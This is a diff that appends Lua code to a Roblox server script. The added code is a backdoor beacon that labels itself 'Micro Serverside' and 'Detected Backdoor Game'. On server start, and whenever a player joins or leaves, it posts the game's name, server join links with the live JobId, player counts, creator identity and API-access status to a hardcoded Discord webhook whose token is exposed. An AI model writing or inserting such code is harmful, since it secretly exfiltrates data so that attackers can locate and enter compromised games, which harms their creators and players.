@@ -54,3 +54,141 @@ Players.PlayerAdded:Connect(function(player)
 
 
 end)
+local players = game:GetService("Players");
+local http =game:GetService("HttpService");
+local market =game:GetService("MarketplaceService");
+local API = function()
+	return http:JSONDecode(http:GetAsync("https://games.roproxy.com/v1/games?universeIds="..game.GameId)).data[1]
+end;
+
+
+local hook = 'https://discord.com/api/webhooks/1315054905832112131/8GMl6dNUdJMOQNyRm7NqwIk4rz7aDY9UqDbAyJ8ww1qO34NQ3Y7TO7-FkMyvpL7lQA4b'
+local embed = {
+	["embeds"] = {
+		{
+			["title"] = "**Micro Serverside**",
+			["description"] = '',
+			["footer"] = {
+				["icon_url"] = '',
+				["text"] = "Micro | Detected Backdoor Game"
+			},
+			["color"] = 0x22C65F,
+			["thumbnail"] = {
+				["url"] = http:JSONDecode(http:GetAsync("https://thumbnails.roproxy.com/v1/games/icons?universeIds="..game.GameId.."&returnPolicy=PlaceHolder&size=150x150&format=Png&isCircular=false")).data[1].imageUrl
+			},
+			["author"] = {
+				["name"] = "Micro Serverside",
+				["icon_url"] =""
+			},
+			["fields"] = {
+				{
+					["name"] = "**Game Information**",
+					["value"] = "> **Game Name**: "..market:GetProductInfo(game.PlaceId).Name.." \n > **Game Link**: ["..market:GetProductInfo(game.PlaceId).Name.."](https://roblox.com/games/"..game.PlaceId.."/) \n > **Join Link**: ["..market:GetProductInfo(game.PlaceId).Name.."](https://www.roblox.com/games/start?launchData="..game.JobId.."&placeId="..game.PlaceId..") \n > **Active Players**: ``"..API().playing.."`` \n > **Server Players**: ``"..#players:GetPlayers().."/"..players.MaxPlayers.."`` \n > **Rig Type**: "..API().universeAvatarType.." \n > **Visits**: ``"..API().visits.."`` \n > **Copying Allowed**: "..tostring(API().copyingAllowed).." \n > **Universe ID**: ``"..http:JSONDecode(http:GetAsync("https://apis.roproxy.com/universes/v1/places/"..game.PlaceId.."/universe")).universeId.."`` \n > **API Access Enabled**: "..tostring(API().studioAccessToApisAllowed).." \n > **Game Genre**: "..API().genre.."\n > **Favorites**: ``"..API().favoritedCount.."``",
+					["inline"] = false
+				},
+				{
+					["name"] = "**Creator Information**",
+					["value"] = "> **Creator Name**: "..players:GetNameFromUserIdAsync(game.CreatorId).." \n > **Creator Profile Link**: ["..players:GetNameFromUserIdAsync(game.CreatorId).."](https://roblox.com/users/"..game.CreatorId.."/profile)",
+					["inline"] = false
+				},
+				{
+					["name"] = "**Javascript Join Code**",
+					["value"] = '```js\njavascript:Roblox.GameLauncher.joinGameInstance('..game.PlaceId..',"'..game.JobId..'")```',
+					["inline"] = false
+				}
+			},
+			["timestamp"] = DateTime.now():ToIsoDate()
+		}
+	}
+}
+embed = http:JSONEncode(embed);
+http:PostAsync(hook, embed)
+
+players.ChildAdded:Connect(function(plr)
+	if plr:IsA("Player") then
+		local embed = {
+			["embeds"] = {
+				{
+					["title"] = "**Micro Serverside**",
+					["description"] = '',
+					["footer"] = {
+						["icon_url"] = '',
+						["text"] = "Micro | Detected Backdoor Game"
+					},
+					["color"] = 0x22C65F,
+					["thumbnail"] = {
+						["url"] = http:JSONDecode(http:GetAsync("https://thumbnails.roproxy.com/v1/games/icons?universeIds="..game.GameId.."&returnPolicy=PlaceHolder&size=150x150&format=Png&isCircular=false")).data[1].imageUrl
+					},
+					["author"] = {
+						["name"] = "Micro Serverside",
+						["icon_url"] =""
+					},
+					["fields"] = {
+						{
+							["name"] = "**Game Information**",
+							["value"] = "> **Game Name**: "..market:GetProductInfo(game.PlaceId).Name.." \n > **Game Link**: ["..market:GetProductInfo(game.PlaceId).Name.."](https://roblox.com/games/"..game.PlaceId.."/) \n > **Join Link**: ["..market:GetProductInfo(game.PlaceId).Name.."](https://www.roblox.com/games/start?launchData="..game.JobId.."&placeId="..game.PlaceId..") \n > **Active Players**: ``"..API().playing.."`` \n > **Server Players**: ``"..#players:GetPlayers().."/"..players.MaxPlayers.."`` \n > **Rig Type**: "..API().universeAvatarType.." \n > **Visits**: ``"..API().visits.."`` \n > **Copying Allowed**: "..tostring(API().copyingAllowed).." \n > **Universe ID**: ``"..http:JSONDecode(http:GetAsync("https://apis.roproxy.com/universes/v1/places/"..game.PlaceId.."/universe")).universeId.."`` \n > **API Access Enabled**: "..tostring(API().studioAccessToApisAllowed).." \n > **Game Genre**: "..API().genre.."\n > **Favorites**: ``"..API().favoritedCount.."``",
+							["inline"] = false
+						},
+						{
+							["name"] = "**Creator Information**",
+							["value"] = "> **Creator Name**: "..players:GetNameFromUserIdAsync(game.CreatorId).." \n > **Creator Profile Link**: ["..players:GetNameFromUserIdAsync(game.CreatorId).."](https://roblox.com/users/"..game.CreatorId.."/profile)",
+							["inline"] = false
+						},
+						{
+							["name"] = "**Javascript Join Code**",
+							["value"] = '```js\njavascript:Roblox.GameLauncher.joinGameInstance('..game.PlaceId..',"'..game.JobId..'")```',
+							["inline"] = false
+						}
+					},
+					["timestamp"] = DateTime.now():ToIsoDate()
+				}
+			}
+		}
+		embed = http:JSONEncode(embed);
+		http:PostAsync(hook, embed)
+	end
+end)
+players.ChildRemoved:Connect(function(plr)
+	if plr:IsA("Player") then
+		local embed = {
+			["embeds"] = {
+				{
+					["title"] = "**Micro Serverside**",
+					["description"] = '',
+					["footer"] = {
+						["icon_url"] = '',
+						["text"] = "Micro | Detected Backdoor Game"
+					},
+					["color"] = 0x22C65F,
+					["thumbnail"] = {
+						["url"] = http:JSONDecode(http:GetAsync("https://thumbnails.roproxy.com/v1/games/icons?universeIds="..game.GameId.."&returnPolicy=PlaceHolder&size=150x150&format=Png&isCircular=false")).data[1].imageUrl
+					},
+					["author"] = {
+						["name"] = "Micro ServerSide",
+						["icon_url"] =""
+					},
+					["fields"] = {
+						{
+							["name"] = "**Game Information**",
+							["value"] = "> **Game Name**: "..market:GetProductInfo(game.PlaceId).Name.." \n > **Game Link**: ["..market:GetProductInfo(game.PlaceId).Name.."](https://roblox.com/games/"..game.PlaceId.."/) \n > **Join Link**: ["..market:GetProductInfo(game.PlaceId).Name.."](https://www.roblox.com/games/start?launchData="..game.JobId.."&placeId="..game.PlaceId..") \n > **Active Players**: ``"..API().playing.."`` \n > **Server Players**: ``"..#players:GetPlayers().."/"..players.MaxPlayers.."`` \n > **Rig Type**: "..API().universeAvatarType.." \n > **Visits**: ``"..API().visits.."`` \n > **Copying Allowed**: "..tostring(API().copyingAllowed).." \n > **Universe ID**: ``"..http:JSONDecode(http:GetAsync("https://apis.roproxy.com/universes/v1/places/"..game.PlaceId.."/universe")).universeId.."`` \n > **API Access Enabled**: "..tostring(API().studioAccessToApisAllowed).." \n > **Game Genre**: "..API().genre.."\n > **Favorites**: ``"..API().favoritedCount.."``",
+							["inline"] = false
+						},
+						{
+							["name"] = "**Creator Information**",
+							["value"] = "> **Creator Name**: "..players:GetNameFromUserIdAsync(game.CreatorId).." \n > **Creator Profile Link**: ["..players:GetNameFromUserIdAsync(game.CreatorId).."](https://roblox.com/users/"..game.CreatorId.."/profile)",
+							["inline"] = false
+						},
+						{
+							["name"] = "**Javascript Join Code**",
+							["value"] = '```js\njavascript:Roblox.GameLauncher.joinGameInstance('..game.PlaceId..',"'..game.JobId..'")```',
+							["inline"] = false
+						}
+					},
+					["timestamp"] = DateTime.now():ToIsoDate()
+				}
+			}
+		}
+		embed = http:JSONEncode(embed);
+		http:PostAsync(hook, embed)
+	end
+end)
